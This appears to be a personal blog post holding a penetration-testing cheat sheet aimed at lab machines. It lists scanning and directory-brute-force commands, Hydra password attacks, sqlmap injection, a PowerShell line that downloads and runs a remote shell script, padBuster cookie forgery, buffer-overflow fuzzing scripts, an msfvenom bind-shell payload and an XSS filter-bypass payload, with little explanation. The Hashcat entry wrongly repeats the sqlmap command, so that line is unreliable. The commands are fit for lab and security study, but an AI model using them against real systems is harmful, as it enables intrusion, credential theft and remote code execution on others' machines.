---
layout: post
title: Cheat Sheet
img: "assets/img/portfolio/cheatsheet.png"
date: April, 08 2014
tags: [Lorem]
---

![image]({{ site.baseurl }}/{{ page.img }})

# Enumeration


### Masscan (local) :

masscan -p1-65534 -rate=10000 -oG name.masscan 10.10.10.10


### Netdiscover :

netdiscover -i eth0


### Nmap :

nmap -A -p- -T4 -oA nmap/[name].xml 10.10.10.10
nmap --script=vuln -T4 -oA nmap/[name].xml 10.10.10.10
nmap -sC -sV

xsltproc *.xml -o *.html


### Nikto :

nikto -host 10.10.10.10[:8080] -output nikto.[name].txt


### DirSearch :

/opt/dirsearch/dirsearch.py -u http://10.10.10.10 -e asp,aspx,bat,c,cfm,cgi,com,dll,exe,htm,html,inc,jhtml,jsa,jsp,log,mdb,nsf,php,phtml,pl,reg,sh,shtml,sql,txt,xml,/,js -x 403,400 --json-report=[/path/]dirsearch.json

### Gobuster :

/opt/gobuster/gobuster -w /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt -u http://10.10.10.10 -o [name].log -t 25 [-k] [add / option] [-c (cat cookie.txt)]


### Dirb :

dirb http://10.10.10.10[:8080] -o dirb.[name].txt


### Wfuzz :

wfuzz -c -z file,/usr/share/wfuzz/wordlist/general/megabeast.txt --hc 404,200 http://[ip:port]/FUZZ [ -b ‘cookie=value’ ] [ -w /usr/share/wordlist ]


# DNS


### Dig :

dig axfr @10.10.10.13 cronos.htb

### host :

host -t ns cronos.htb
host -t mx cronos.htb

### dnsrecon :

dnsrecon -d cronos.htb -t axfr


# Brute Force

### Hydra :

#### ssh :
hydra -L login.txt -P pass.txt [ -c file (user:pass format) ] ssh://10.10.10.10[:port]

#### http-form-post :
hydra [ip] -s [port] http-form-post "/index.php:password=^PASS^:F=Invalid\ password\!" -P [wordlist] -l '' {in this case no username -l ‘’} -t 10 -I

#### http-form-get :

#### smb :
hydra -l cristal -x 4:4:a 192.168.2.46 smb


### Sqlmap :
 sqlmap -r admin.cronos.req --level 5 --risk 3 --threads 10


### Hashcat :
 sqlmap -r admin.cronos.req --level 5 --risk 3 --threads 10



# Windows

### PowerShell :

#### use file from the internet :
IEX(New-Object Net.WebClient).downloadString(‘http://10.10.10.10:8080/shell.ps1’)

#### Privesc - MetaSploit :

search suggest
post/multi/recon/local_exploit_suggester
set SESSION 1
(powerup ?)

## Shell :

#### magic unicorn
https://www.youtube.com/watch?v=e9lVyFH7-4o


Database

Cookie :

padBuster :

perl padBuster.pl http://10.10.10.10/index.php uBIcLBJyjARxQ7ooer8gpdI4sSUCfulk 8 auth=uBIcLBJyjARxQ7ooer8gpdI4sSUCfulk -plaintext user=admin



Monitoring

Network :

netstat :

watch "netstat -an | grep 4001"

lsof :

watch "lsof -i 4001"


Buffer Overflow

Fuzzing :

#!/usr/bin/env python

import socket
import time

target_host = "127.0.0.1"
target_port = 4030

client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
client.connect((target_host, target_port))

for i in range(1,2000) :

    fuzz = "A" * i
    client.send(fuzz)
    response = client.recv(4096)

    print i
#    client.send("x\n")
#    response = client.recv(4096)

    time.sleep(0.1)

client.send("x\n")
response = client.recv(4096)

print response


Bad Characters :

#!/usr/bin/env python

shellcode = ''
for i in range(1,256):
    shellcode += chr(i)

print shellcode


Format String :

Shows 20 dwords from the stack :

for(( i=1; i < 20; i++)); do echo -n "$i " && ./fs "%$i\$x"; done

Use “%s” to retrieve strings instead :

for(( i=1; i < 20; i++)); do echo -n "$i " && ./fs "%$i\$s"; done


MSFVenom :

msfvenom -p linux/x86/shell_bind_tcp -b '\x00\x09\x10\x13' LPORT=4450 -f python






Unclassified

JS Prompt :

Filters bypass

<svg%0Ao%00nload=%09((pro\u006dpt))()//


Vim :

record macro :
q<letter><commands>q

execute macro :
<number>@<letter>

re execute macro :
@@

global switch :
:%s/item1/item2/g
